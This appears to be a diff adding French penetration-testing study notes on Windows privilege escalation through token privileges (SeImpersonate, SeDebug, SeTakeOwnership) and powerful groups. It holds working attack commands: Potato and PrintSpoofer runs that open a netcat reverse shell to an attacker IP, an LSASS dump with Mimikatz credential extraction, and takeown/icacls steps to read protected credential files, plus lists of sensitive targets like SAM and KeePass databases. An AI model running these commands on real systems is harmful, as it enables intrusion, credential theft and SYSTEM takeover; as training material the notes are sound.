@@ -294,6 +294,210 @@ Cela signifie que **tous les utilisateurs** peuvent écrire dedans → escalade 
 
 --- 
 
+# Windows Privileges Overview
+
+## Définition  
+Les **privilèges Windows** sont des droits système accordés à un compte pour exécuter certaines actions :  
+- gérer des services,  
+- charger des drivers,  
+- déboguer des programmes,  
+- accéder à des fichiers protégés, etc.  
+
+Ils sont différents des **droits d’accès** (permissions sur objets) et sont stockés dans le **token d’accès** de chaque utilisateur.
+
+> Les privilèges peuvent être **désactivés** par défaut et activés uniquement dans une session **élevée (Admin)**.
+
+## Processus d’autorisation  
+Lorsqu’un utilisateur tente d’accéder à une ressource :
+1. Windows lit le **token** (User SID, Group SIDs, Privileges, etc.).  
+2. Compare ces infos avec les **ACEs** de l’objet (liste des droits).  
+3. Autorise ou bloque l’action.
+
+L’exploitation consiste à **abuser de privilèges ou groupes** pour détourner ce processus.
+
+## 👥 Groupes puissants (à surveiller)
+| Groupe | Description / Risques |
+|--------|------------------------|
+| **Administrators** | Accès total au système |
+| **Domain Admins / Enterprise Admins** | Contrôle total AD |
+| **Server Operators** | Gèrent services, fichiers, partages SMB |
+| **Backup Operators** | Peuvent copier SAM/NTDS, lire registre distant |
+| **Print Operators** | Peuvent charger un driver malveillant |
+| **Hyper-V Administrators** | Accès aux VMs (peut inclure DCs) |
+| **Account Operators** | Modifient comptes non protégés |
+| **Remote Desktop Users** | Accès RDP (souvent élargi en pratique) |
+| **Remote Management Users** | Accès PowerShell Remoting |
+| **Schema Admins** | Modifient le schéma AD |
+| **DNS Admins** | Peuvent charger DLLs (persistance) |
+
+## Principaux droits (User Rights Assignment)
+
+| Constante | Nom | Groupes | Description |
+|------------|------|----------|-------------|
+| **SeNetworkLogonRight** | Accès via réseau | Admins, Users | Connexion via SMB, NetBIOS… |
+| **SeRemoteInteractiveLogonRight** | Connexion RDP | Admins, RDP Users | Connexion via RDP |
+| **SeBackupPrivilege** | Sauvegarder fichiers | Admins | Contourne ACL pour backup |
+| **SeRestorePrivilege** | Restaurer fichiers | Admins | Restaure fichiers protégés |
+| **SeTakeOwnershipPrivilege** | Prendre possession d’objets | Admins | Changer propriétaire d’un fichier |
+| **SeDebugPrivilege** | Debug de processus | Admins | Attacher à n’importe quel processus |
+| **SeImpersonatePrivilege** | Usurper un utilisateur | Admins, Services | Base des attaques Potato |
+| **SeLoadDriverPrivilege** | Charger drivers | Admins | Code kernel exécutable |
+| **SeTcbPrivilege** | Agir comme OS | Admins, Services | Impersonation complète (haut risque) |
+
+
+## Ressources
+- [Script pour activer les privilèges](https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts%5CEnable-Privilege.ps1)
+- [Script pour activer les privilèges](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/)
+
+---
+
+## SeImpersonate & SeAssignPrimaryToken
+
+**Ce que c’est**  
+- Les tokens de processus décrivent le contexte de sécurité (qui exécute quoi).  
+- `SeImpersonatePrivilege` permet à un processus d'« emprunter » (impersonate) le token d'un autre utilisateur après authentification.  
+- `SeAssignPrimaryTokenPrivilege` permet de remplacer le token principal d'un processus (plus rare).  
+- Ces privilèges sont souvent assignés à des services et sont la base des attaques *Potato* (Juicy/Rogue/PrintSpoofer) pour obtenir `NT AUTHORITY\SYSTEM`.
+
+**Pourquoi ça nous intéresse**  
+- Si un compte/service a `SeImpersonate` (même s’il n’est pas admin), on peut souvent forcer la création d’un processus SYSTEM via des outils publics.  
+- Fréquent après RCE via web/app (webshell, `xp_cmdshell`, etc.) : vérifier immédiatement.
+
+**Vérifier en premier**  
+- Exécuter : `whoami /priv`  
+- Chercher `SeImpersonatePrivilege` ou `SeAssignPrimaryTokenPrivilege` en état `Enabled`.
+
+**Flux d’exploitation (ex. JuicyPotato)**  
+1. obtenir RCE (ex. via `xp_cmdshell` ou webshell).  
+2. uploader `JuicyPotato.exe` et `nc.exe`.  
+3. lancer un listener local : `nc -lnvp 8443`  
+4. exécuter JuicyPotato :  
+   `JuicyPotato.exe -l 53375 -p C:\Windows\System32\cmd.exe -a "/c C:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *`  
+5. si ça marche → shell `nt authority\system` sur votre listener.
+
+**Alternatives (versions récentes)**
+- `JuicyPotato` fonctionne mal/plus sur Win10 1809+ / Server 2019.  
+- Utiliser `PrintSpoofer` ou `RoguePotato` (fonctionnent sur builds plus récentes) : exemple :  
+  `PrintSpoofer.exe -c "C:\tools\nc.exe 10.10.14.3 8443 -e cmd"`  
+  → listener `nc -lnvp 8443` pour catcher la session SYSTEM.
+
+### Ressources
+- [JuicyPotato](https://github.com/ohpe/juicy-potato)
+- [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
+- [RoguePotato](https://github.com/antonioCoco/RoguePotato)
+
+---
+
+## SeDebugPrivilege
+
+**C’est quoi ?**  
+- `SeDebugPrivilege` permet d’ouvrir/inspecter n’importe quel processus pour le débogage.  
+- Par défaut réservé aux administrateurs — parfois donné à des développeurs/service accounts.  
+- Très puissant : accès à la mémoire système (ex. LSASS) → récupération de credentials ou RCE en SYSTEM.
+
+**Vérifier rapidement**  
+- `whoami /priv` → chercher `SeDebugPrivilege` (Disabled = présent mais non actif dans le token actuel).
+
+**Exploitation courante : dump LSASS → extraire mots de passe**
+1. Dumper la mémoire de LSASS :  
+   `procdump.exe -accepteula -ma lsass.exe lsass.dmp`
+2. Récupérer mots de passe NTLM/cleartext :  
+   Dans Mimikatz :  
+   `sekurlsa::minidump lsass.dmp`  
+   `sekurlsa::logonPasswords`
+
+*(si pas de binaires autorisés : via RDP → Task Manager → Details → Create dump file → télécharger et analyser localement)*
+
+**Exploitation alternative : utiliser la capacité de debugging pour obtenir RCE SYSTEM**  
+- PoC/outil courant : `psgetsystem` / script PowerShell qui utilise le parent PID SYSTEM.  
+- Usage générique du PoC :  
+  `[MyProcess]::CreateProcessFromParent(<system_pid>, <command_to_execute>, "")`  
+- Exemple pratique : récupérer PID d’un process SYSTEM (`tasklist` ou `Get-Process`) puis lancer la commande pour créer un child process héritant du token SYSTEM.
+
+**Autres outils / méthodes**
+- Plusieurs PoC publics popent un shell SYSTEM quand `SeDebugPrivilege` est présent.  
+- On peut aussi injecter/modifier un service/process pour exécuter un binaire en SYSTEM.
+
+**Précautions**
+- Actions très noisy et détectables (EDR/AV).  
+- Dumping LSASS contient beaucoup de secrets — manipuler avec prudence et effacer traces.  
+- Ne pas tester sur des environnements de production sans autorisation.
+
+**Checklist rapide**
+- `whoami /priv` → confirme la présence.  
+- `tasklist` / `Get-Process` → choisir cible SYSTEM (ex. `winlogon.exe`, `lsass.exe`).  
+- Si possible : `procdump` → Mimikatz pour récupérer credentials.  
+- Sinon : PoC CreateProcessFromParent / psgetsystem / autres → obtenir shell SYSTEM.
+
+### Ressources 
+- [psgetsystem](https://github.com/decoder-it/psgetsystem)
+
+--- 
+
+## SeTakeOwnershipPrivilege
+
+`SeTakeOwnershipPrivilege` permet à un utilisateur de **prendre possession** d’un objet sécurisable (fichiers NTFS, clés de registre, services, objets AD, imprimantes, etc.). 
+Concrètement il donne le droit `WRITE_OWNER` sur l’objet — l’utilisateur peut en changer le propriétaire et ensuite modifier les ACL pour se donner l’accès. 
+Par défaut attribué aux administrateurs ; rare pour un utilisateur standard, mais possible pour des comptes de services (ex : comptes de sauvegarde).
+
+> Modifier la propriété/ACL d’objets sensibles peut interrompre des services ou casser des applis. Toujours obtenir l’accord client et documenter/annuler les changements si possible.
+
+### Vérifier si on a le droit
+- Voir les privilèges actuels : `whoami /priv`  
+  Chercher `SeTakeOwnershipPrivilege` (si `Disabled` → présent mais non activé dans le token actuel).
+
+### Activer le privilège dans le token courant
+Windows n’active pas automatiquement tous les privilèges listés dans le token. 
+On peut utiliser des scripts PowerShell publics pour activer les privilèges du token, par ex. :  
+- Importer un module d’activation : `Import-Module .\Enable-Privilege.ps1`  
+- Activer les privilèges : `.\EnableAllTokenPrivs.ps1`  
+- Re-vérifier : `whoami /priv` (devrait montrer `SeTakeOwnershipPrivilege` = `Enabled`)
+
+### Flux d’exploitation typique (lecture d’un fichier protégé)
+
+1. **Choisir la cible** (ex. `C:\Department Shares\Private\IT\cred.txt`)  
+   - Voir propriétaire / métadonnées :  
+     `Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}`
+
+2. **Vérifier l’ownership du répertoire** (optionnel) :  
+   `cmd /c dir /q 'C:\Department Shares\Private\IT'`
+
+3. **Prendre possession du fichier** :  
+   `takeown /f 'C:\Department Shares\Private\IT\cred.txt'`  
+   → message `SUCCESS: ... now owned by user "DOMAIN\you"`
+
+4. **(Si nécessaire) modifier l’ACL pour se donner l’accès** :  
+   `icacls 'C:\Department Shares\Private\IT\cred.txt' /grant youruser:F`  
+   → `processed file... Successfully processed 1 files`
+
+5. **Lire le fichier** :  
+   `Get-Content 'C:\Department Shares\Private\IT\cred.txt'`  
+   ou `cat 'C:\Department Shares\Private\IT\cred.txt'`
+
+6. **Nettoyage / restitution** : documenter et, si possible, remettre propriétaire/ACL d’origine.
+
+### Quand utiliser ce privilège ?
+- Quand d’autres vecteurs sont bloqués (ex. pas d’exécution d’exploits, pas d’accès direct) et que l’accès à un fichier précis peut fournir credentials/clefs/secret nécessaires pour l’escalade.
+- Exemples de cibles intéressantes : fichiers de config web (`web.config`), secrets (`cred*`, `password*`), bases KeePass (`.kdbx`), fichiers système (`%WINDIR%\system32\config\*`), fichiers de sauvegarde, clés SSH, etc.
+
+### Exemples de fichiers souvent visés
+- `c:\inetpub\wwwroot\web.config`  
+- `%WINDIR%\system32\config\software.sav`  
+- `%WINDIR%\repair\sam`  
+- Fichiers `*.kdbx`, `creds.*`, `pass.*`, `*.pem` ou scripts contenant des secrets
+
+---
+
+
+
+
+
+
+
+
+
+
+
 
 
 
